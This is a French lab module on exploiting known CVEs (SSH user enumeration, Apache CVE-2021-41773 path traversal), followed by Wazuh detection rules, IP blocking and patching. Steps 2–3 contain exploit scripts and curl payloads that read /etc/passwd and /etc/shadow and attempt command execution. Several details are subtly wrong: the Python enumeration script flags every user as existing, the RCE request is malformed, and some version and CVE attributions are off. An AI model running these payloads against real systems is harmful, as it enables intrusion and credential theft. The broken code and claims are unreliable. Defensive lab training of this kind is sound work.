# 07 – Exploitation CVE & Vulnérabilités connues
**Durée estimée** : 2h | **Niveau** : Avancé | **Prérequis** : 05_escalade_privileges.md

---

## 🎯 Objectif

Identifier et exploiter des **vulnérabilités CVE connues** (Common Vulnerabilities and Exposures) sur des services exposés.

Une CVE est une vulnérabilité de sécurité documentée et suivie publiquement, avec un numéro unique (CVE-YYYY-XXXX).

**Compétences validées** :
- Reconnaissance et scan de vulnérabilités
- Exploitation CVE avec Metasploit ou scripts custom
- Chaîne d'exploitation complète
- Corrélation logs/détection avancée

---

## 📋 Concepts clés

### Cycle de vie d'une CVE

```
1. Découverte        → Vulnerability found
2. Divulgation       → CVE assigned (CVE-2023-XXXXX)
3. Patch release     → Vendor publishes fix
4. Adoption          → Admins apply patches
5. Exploitation      → Attackers use public PoC
```

### Services vulnérables courants

Dans un environnement **Rocky Linux** typique :

| Service | Versions vulnérables | Exemple CVE |
|---------|---------------------|------------|
| **OpenSSH** | < 8.0 | CVE-2018-15473 |
| **Nginx** | < 1.19 | CVE-2021-23017 |
| **Apache** | < 2.4.50 | CVE-2021-41773 |
| **Java/Tomcat** | < 9.0 | CVE-2021-44228 |
| **Sudo** | < 1.9.5 | CVE-2021-3156 |

---

## 🔍 Étape 1 – Identification des vulnérabilités

### 1.1 – Scanner Nessus / OpenVAS

**Sur machine Kali** :

```bash
# Installation OpenVAS
sudo apt update && sudo apt install openvas -y

# Démarrer le service
sudo openvas-setup

# Accès Web
# Ouvrir navigateur → https://127.0.0.1:9392
```

**Alternative : Nmap avec scripts NSE** :

```bash
nmap -sV --script vuln http://192.168.1.10
```

**Output (exemple)** :
```
Nmap scan report for 192.168.1.10
Host is up (0.0030s latency).

22/tcp open  ssh     OpenSSH 7.4p1
| ssh-known-key: WEAK RSA key
|_  1024 bits (weak key)

80/tcp open  http    Nginx 1.14.1
| http-slowloris-check: 
|  VULNERABLE
|_  Slowloris HTTP DoS attack

111/tcp open rpc
|_rpcinfo: Not Available
```

### 1.2 – Recherche manuelle d'une CVE

**Étape 1** : Identifier version du service

```bash
# SSH
ssh -V
# OpenSSH_7.4p1, OpenSSL 1.0.2k-fips

# Nginx
curl -I http://192.168.1.10/
# Server: nginx/1.14.1

# Apache
curl -I http://192.168.1.10/
# Server: Apache/2.4.6 (CentOS)
```

**Étape 2** : Rechercher la CVE correspondante

```bash
# Base de données CVE
https://cve.mitre.org/
https://nvd.nist.gov/

# Exemple : Rechercher "OpenSSH 7.4" → CVE-2018-15473
```

### 1.3 – Utiliser searchsploit (local)

```bash
# Installation
sudo apt install exploitdb -y

# Recherche locale
searchsploit "OpenSSH 7.4"
searchsploit "Nginx 1.14"
searchsploit "Apache 2.4.6"
```

**Output (exemple)** :
```
Exploits: OpenSSH 7.4
 Exploit Title | Path
OpenSSH 2.3 < 2.8 - Username Enumeration | exploits/linux/remote/21314.txt
OpenSSH < 7.4 - 'UseLogin' Privilege Escalation | exploits/linux/local/40888.sh
OpenSSH 7.4 - Privilege Escalation | exploits/linux/local/40873.sh
```

---

## 💉 Étape 2 – Exploitation manuelle (Exemple CVE OpenSSH)

### Exemple : CVE-2018-15473 (User Enumeration SSH)

**Vulnérabilité** : OpenSSH avant 7.7 divulgue si un utilisateur existe via timing

### 2.1 – Script PoC (Python)

Créer `ssh_enum.py` :

```python
#!/usr/bin/env python3
# SSH User Enumeration - CVE-2018-15473

import paramiko
import sys

def check_user(host, port, username):
    """
    Check if username exists via SSH timing attack
    """
    transport = paramiko.Transport((host, port))
    
    try:
        transport.connect(username=username, password='fake_pass')
    except paramiko.AuthenticationException:
        # User exists but wrong password
        return True
    except paramiko.SSHException as e:
        # User doesn't exist
        return False
    finally:
        transport.close()

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else '192.168.1.10'
    port = 2222  # SSH port (voir 04_hardening.md)
    
    users = ['root', 'admin', 'user', 'test', 'apache', 'www-data']
    
    print(f"[*] Enumerating users on {target}:{port}")
    
    for user in users:
        exists = check_user(target, port, user)
        status = "[+] EXISTS" if exists else "[-] NOT FOUND"
        print(f"{status} : {user}")
```

**Lancer** :

```bash
python3 ssh_enum.py 192.168.1.10
```

**Output (exemple)** :
```
[*] Enumerating users on 192.168.1.10:2222
[+] EXISTS : root
[+] EXISTS : admin
[-] NOT FOUND : test
[+] EXISTS : user
```

### 2.2 – Exploitation via Metasploit

**Alternative : Utiliser Metasploit** (plus facile) :

```bash
# Démarrer msfconsole
msfconsole

# Chercher module SSH
search ssh_enum
# Résultat : auxiliary/scanner/ssh/ssh_enumusers

# Configurer
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.1.10
set RPORT 2222
set USER_FILE /usr/share/wordlists/users.txt

# Lancer
exploit
```

**Output (exemple)** :
```
[*] 192.168.1.10:2222 - SSH running (OpenSSH 7.4)
[+] 192.168.1.10:2222 - Valid users: admin, root, user
```

---

## 💥 Étape 3 – Exploitation avancée (Exemple Nginx/Apache)

### Exemple : CVE-2021-41773 (Apache Path Traversal)

**Vulnérabilité** : Apache 2.4.49-2.4.50 permet accès aux fichiers via `/.../...//`

### 3.1 – Exploitation manuelle

**Tester la vulnérabilité** :

```bash
# Accéder à /etc/passwd via CVE
curl 'http://192.168.1.10/cgi-bin/.%2e/.%2e/etc/passwd'

# Ou directement
curl 'http://192.168.1.10/cgi-bin/../../../etc/passwd'
```

**Output (exemple)** :
```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
```

### 3.2 – Script d'exploitation

Créer `apache_cve_exploit.sh` :

```bash
#!/bin/bash
# CVE-2021-41773 - Apache Path Traversal Exploit

TARGET="$1"
[ -z "$TARGET" ] && { echo "Usage: $0 <target_ip>"; exit 1; }

echo "[*] Exploiting CVE-2021-41773 on $TARGET"

# Test 1: /etc/passwd
echo "[+] Attempting to read /etc/passwd..."
curl -s "http://$TARGET/cgi-bin/.%2e/.%2e/etc/passwd" | head -5

# Test 2: /etc/shadow (may need elevated privileges)
echo "[+] Attempting to read /etc/shadow..."
curl -s "http://$TARGET/cgi-bin/.%2e/.%2e/etc/shadow" 2>&1

# Test 3: Apache config
echo "[+] Attempting to read Apache config..."
curl -s "http://$TARGET/cgi-bin/.%2e/.%2e/etc/apache2/apache2.conf" 2>&1 | head -10

# Test 4: RCE via CGI
echo "[+] Attempting RCE..."
curl -s "http://$TARGET/cgi-bin/.%2e/.%2e/bin/bash?-c=id" 2>&1
```

**Lancer** :

```bash
chmod +x apache_cve_exploit.sh
./apache_cve_exploit.sh 192.168.1.10
```

---

## 🔍 Étape 4 – Détection via Wazuh

### 4.1 – Logs générés

Les tentatives d'exploitation génèrent des logs distinctifs :

```bash
# SSH enumeration
tail -20 /var/log/secure | grep "Invalid user\|Failed password"

# Apache path traversal
tail -20 /var/log/apache2/access.log | grep "\.%2e\|\.\./"

# Nginx
tail -20 /var/log/nginx/access.log
```

**Output SSH (exemple)** :
```
Feb 10 14:25:10 rocky-web sshd[5432]: Invalid user test from 192.168.1.5 port 54321
Feb 10 14:25:11 rocky-web sshd[5433]: Invalid user admin from 192.168.1.5 port 54322
Feb 10 14:25:12 rocky-web sshd[5434]: Failed password for invalid user root from 192.168.1.5 port 54323
```

**Output Apache (exemple)** :
```
192.168.1.5 - - [10/Feb/2026:14:25:15 +0000] "GET /cgi-bin/.%2e/.%2e/etc/passwd HTTP/1.1" 200 3402
192.168.1.5 - - [10/Feb/2026:14:25:16 +0000] "GET /cgi-bin/.%2e/.%2e/etc/shadow HTTP/1.1" 403 1234
```

### 4.2 – Règles Wazuh personnalisées

Créer dans `/var/ossec/etc/rules/local_rules.xml` :

```xml
<!-- CVE Detection Rules -->

<!-- SSH User Enumeration (CVE-2018-15473) -->
<rule id="200201" level="7">
    <if_sid>5701</if_sid>
    <match>Invalid user</match>
    <description>SSH User Enumeration Attack Detected (CVE-2018-15473)</description>
    <group>cve_attack</group>
</rule>

<rule id="200202" level="9">
    <if_sid>200201</if_sid>
    <same_source_user></same_source_user>
    <frequency>
        <entries_within_time>1m</entries_within_time>
        <timeframe>1m</timeframe>
        <ignore_repetitions>3</ignore_repetitions>
    </frequency>
    <description>Multiple SSH User Enumeration Attempts (CVE-2018-15473)</description>
    <group>cve_attack</group>
</rule>

<!-- Apache Path Traversal (CVE-2021-41773) -->
<rule id="200203" level="8">
    <if_sid>31101</if_sid>
    <regex>\.%2e|\.\.\/|\/\.\.\/|\.\.\%2f</regex>
    <description>Apache Path Traversal Attack Detected (CVE-2021-41773)</description>
    <group>cve_attack</group>
</rule>

<!-- Nginx Directory Traversal -->
<rule id="200204" level="7">
    <if_sid>31116</if_sid>
    <regex>\.\.\/|\.\.%2f</regex>
    <description>Possible Directory Traversal in Nginx</description>
    <group>cve_attack</group>
</rule>
```

**Appliquer** :

```bash
# Sur VM2 (SOC)
sudo systemctl restart wazuh-manager

# Vérifier les règles
sudo grep "200201\|200202\|200203\|200204" /var/ossec/etc/rules/local_rules.xml
```

### 4.3 – Alertes Wazuh

Après exploitation, vérifier les alertes :

```bash
# Via Web UI Wazuh
# Threat Detection → Events → Filter by "cve_attack"

# Via CLI
grep "cve_attack" /var/ossec/logs/alerts/alerts.json | jq '.rule.description'
```

---

## 🛡️ Étape 5 – Réaction (Incident Response)

### 5.1 – Identifier la source de l'attaque

```bash
# Rechercher l'IP attaquante dans les logs
grep "Invalid user" /var/log/secure | awk '{print $12}' | sort -u

# Exemple output
192.168.1.5
```

### 5.2 – Bloquer l'attaquant via Firewall

**Script de réaction automatique** :

```bash
#!/bin/bash
# block_attacker.sh - Bloquer une IP suspecte

ATTACKER_IP="$1"
[ -z "$ATTACKER_IP" ] && { echo "Usage: $0 <IP>"; exit 1; }

echo "[*] Blocking $ATTACKER_IP..."

# Ajouter à firewalld
sudo firewall-cmd --permanent --add-rich-rule="rule family='ipv4' source address='$ATTACKER_IP' reject"
sudo firewall-cmd --reload

# Vérifier
sudo firewall-cmd --list-all

echo "[+] $ATTACKER_IP blocked successfully"
```

**Lancer** :

```bash
chmod +x block_attacker.sh
./block_attacker.sh 192.168.1.5
```

### 5.3 – Appliquer les patches

```bash
# Sur VM1, vérifier la version du service vulnérable
ssh user@192.168.1.10

# Exemple : Vérifier OpenSSH
ssh -V

# Mettre à jour
sudo yum update openssh-server -y

# Redémarrer le service
sudo systemctl restart sshd

# Vérifier la nouvelle version
ssh -V
```

### 5.4 – Audit des logs complet

**Script d'audit** :

```bash
#!/bin/bash
# audit_cve_attack.sh - Audit complet d'une attaque CVE

echo "=== SSH USER ENUMERATION ATTEMPTS ==="
grep "Invalid user" /var/log/secure | wc -l

echo ""
echo "=== ATTACKER IPS ==="
grep "Invalid user" /var/log/secure | awk '{print $12}' | sort | uniq -c

echo ""
echo "=== TIMELINE OF ATTACK ==="
grep "Invalid user" /var/log/secure | tail -10

echo ""
echo "=== FIREWALL BLOCKS APPLIED ==="
sudo firewall-cmd --list-all | grep "rule"
```

**Lancer** :

```bash
chmod +x audit_cve_attack.sh
./audit_cve_attack.sh
```

---

## ✅ Vérifications et tests

### Checklist d'exécution

- [ ] CVE identifiée (recherche NVD / CVE-MITRE)
- [ ] Service vulnérable repéré via scan Nmap
- [ ] PoC téléchargé ou rédigé
- [ ] Exploitation manuelle effectuée
- [ ] Logs générés sur serveur vulnérable
- [ ] Wazuh détecte l'exploitation
- [ ] Règles personnalisées créées et testées
- [ ] IP attaquante identifiée
- [ ] IP attaquante bloquée via firewall
- [ ] Service mis à jour/patché
- [ ] Audit complet des logs effectué

### Preuves à documenter

**Capture 1** : Versions des services vulnérables
```bash
ssh -V
curl -I http://192.168.1.10/
```

**Capture 2** : Exploitation successful
```bash
curl 'http://192.168.1.10/cgi-bin/.%2e/.%2e/etc/passwd'
```

**Capture 3** : Logs côté serveur
```bash
tail -20 /var/log/secure
tail -20 /var/log/nginx/access.log
```

**Capture 4** : Alerte Wazuh
```
Screenshot Web UI Wazuh montrant la détection CVE
```

**Capture 5** : Réaction (blocage IP)
```bash
sudo firewall-cmd --list-all | grep rule
```

---

## 📚 Ressources et références

- **CVE Database** : https://cve.mitre.org/
- **NVD (NIST)** : https://nvd.nist.gov/
- **Exploit-DB** : https://www.exploit-db.com/
- **Metasploit** : https://www.metasploit.com/

---

## 🎓 Résumé des apprentissages

| Concept | Détail |
|---------|--------|
| **CVE** | Vulnerability identifiée, documentée, numérotée publiquement |
| **Scan** | Identification des services et versions vulnérables |
| **PoC** | Proof of Concept - exploitation documentée |
| **Timing** | Exploitation via timing attacks ou encodage |
| **Detection** | Logs distinctifs, patterns behav., alertes |
| **Réaction** | Blocage, patch, audit, forensics |

Ce module teste la capacité à identifier et exploiter des vulnérabilités réelles, ainsi que le réponse du SOC.
